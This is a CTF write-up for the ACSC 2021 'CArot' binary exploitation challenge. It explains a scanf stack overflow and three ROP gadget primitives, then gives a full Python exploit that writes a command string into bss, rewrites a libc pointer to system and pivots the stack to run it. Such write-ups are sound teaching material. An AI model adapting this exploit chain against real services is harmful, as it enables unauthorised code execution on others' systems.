![](https://acsc.asia/assets/images/acsc_banner.jpg)

- - -

> # CArot

- - -

> CTF : https://acsc.asia/ <br>
> Challenge files : https://github.com/4n0nym4u5/CTF-Writeups/tree/main/CArot <br>
> Points: 320 <br>

> # Checksec

- - -

```yaml
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  '/home/init0/share/bkup/CTF/ACSC-21/CArot'
```

> # Overview

- - -

These are the challenge files provided:

```css
CArot
├── carot
├── carot.c
├── expl.py
├── ld-2.31.so
├── libc.so.6
├── proxy.py
├── run_carot.sh
├── run_proxy.sh
├── xinetd_carot_conf
└── xinetd_proxy_conf
```

So they have provided the challenge source file `carot.c`. Let's look at it. The source code is pretty huge so ill cut it down to only what's necessary

```c
char* http_receive_request() {
  long long int read_limit = 4096;

  connect_mode = -1;

  char buffer[BUFFERSIZE] = {};
  scanf("%[^\n]", buffer); // stack buffer overflow
  getchar();
  
  if (memcmp(buffer, "GET ", 4) != 0) return NULL;
  
  int n = strlen(buffer); // use \x00 to make n < 9
  read_limit -= n;

  if (n < 9) return NULL; // we have to reach here and then execute our rop
  // ...

int main() {
  setbuf(stdout, NULL);
  while (1) {
    char* fname = http_receive_request();
    // ...
```

The binary uses a python proxy to run. 

```python
#!/usr/bin/python3

from time import sleep
from sys import stdin, stdout, exit
from socket import *

LIMIT = 4096

buf = b''
while True:
  s = stdin.buffer.readline()
  buf += s

  if len(buf) > LIMIT:
    print('You are too greedy')
    exit(0)

  if s == b'\n':
    break

p = socket(AF_INET, SOCK_STREAM)
p.connect(("localhost", 11452))
p.sendall(buf)

sleep(2)

p.setblocking(False)
res = b''
try:
  while True:
    s = p.recv(1024)
    if not s:
      print("breaking")
      break
    res += s
    print(res)
except:
  pass

stdout.buffer.write(res)
```

So because of the proxy we can only send stdin once. Though we can get leaks printed out on stdout we cant use that leak for our second rop chain. So not a simple ret2libc challenge here.  We got only one shot and we printout flag to stdout. So lets move on to exploitation part now (my favourite part UwU).

> # Exploit

- - -

Lets look out for some useful gadgets first. I found some interesting gadget using [xgadget](https://github.com/entropic-security/xgadget). Its a pretty nice rop gadget finder tool. So listing out some useful gadgets here.

```css
0x000000004011c8: add [rbp-0x3d], ebx; nop [rax+rax]; ret; 
0x00000000401902: mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret; 
0x000000004014bd: mov rax, [rbp-0x8]; add rsp, 0x10; pop rbp; ret;
```

These three rop gadgets can be used creatively. <br>

> ## read primitive

```css
0x000000004014bd: mov rax, [rbp-0x8]; add rsp, 0x10; pop rbp; ret;
```

So we can use this gadget to read value of a pointer and store it in rax register <br>

> ## write primitive

```css
0x00000000401902: mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret; 
```

We can use this gadget to write the value stored in rax to any writable memory pointed by \[rbp-0x8]. And then it increments rsp with 0x250 so we have to add a padding of 0x250 bytes and 0x8 bytes to satisfy the pop rbp instruction. <br> 

> ## add primitive

```css
0x000000004011c8: add [rbp-0x3d], ebx; nop [rax+rax]; ret; 
```

We can use this gadget to add the value of a pointer with arbitrary value. So with this primitive we can craft any value. So i used this primitive for arbitrary write what where. My friend `X3ero0` named it as 3dgadget 😂 <br>

So the exploit steps are like this:

1. We read __libc_start_main address into rax.
2. We write __libc_start_main into bss.
3. We write the string "/bin/cat /flag\x00" to bss using the 3dgadget.
4. We use the 3dgadget to change __libc_start_main address to system in bss
5. We stack pivot right above our crafted system address in bss and execute

```c
system("/bin/cat /flag\x00");
```

\### complete exploit

```python
#!/usr/bin/env python3.9
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *

exe  = context.binary = ELF('./carot')
host = args.HOST or '0.0.0.0'
port = int(args.PORT or 11451)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def arb_write(addr, string):
	string=string+b"\x00"*(8-(len(string)%8))
	a=seperate(string, 4)
	j=0
	payload = b""
	for i in a:
		if i == b'\x00\x00\x00\x00':
			j=j+4
			continue # skip the unnecessary add instruction if ebx is 0  
		payload += _3d_write(addr+j, i.ljust(8, b"\x00"))
		j=j+4
	return payload

def _3d_write(addr,value):
	tmp = flat([

		0x4019f2, # pop rbx, rbp, r[12 13 14 15]
		value,
		addr+0x3d,
		p(0)*4,
		_3d_gadget

	])
	return tmp

libc=SetupLibcELF()
io = start()

R = Rootkit(io)

mov_rax_rbp = 0x4014bd #    mov rax,QWORD PTR [rbp-0x8]; add rsp,0x10; ret
_3d_gadget  = 0x4011c8 #    add [rbp-0x3d], ebx; nop [rax+rax]; ret; 
mov_rbp_rax = 0x401902 #    mov [rbp-0x8], rax; mov rax, [rbp-0x8]; add rsp, 0x250; pop rbp; ret;

header = b"GET " + b"\x00"*524
bss=0x404040
system = bss+0xe80

rop=flat([

	header,
	
	# put a libc address at bss
	exe.sym['__libc_start_main']+8, # rbp
	mov_rax_rbp, # make rax point to __libc_start_main
	p(0)*3, # junk
	pop("rbp", system+8),
	mov_rbp_rax, # write rax to bss address (system variable points to that address in bss)
	b"\x00"*0x250, p(0xdeadbeef), # junk

	# write /bin/sh to bss
	arb_write(bss+0x10, b"/bin/cat /flag\x00"),

	# change __libc_start_main to system ; system = __libc_start_main + 0x2e450
	_3d_write(system, p(0x2e450)),

	# write pop rdi -> bss gadget before system address in bss
	arb_write(system-16, gadget("pop rdi; ret") + p(bss+0x10)),

	# call system("/bin/cat /flag\x00")
	0x000000004019f5, # pop rsp; r[13, 14, 15]; ret
	system-24-16, # stack pivot to pop rdi that we crafted above system address in bss 

])
sl(rop)
assert len(rop) < 4096
io.interactive()
```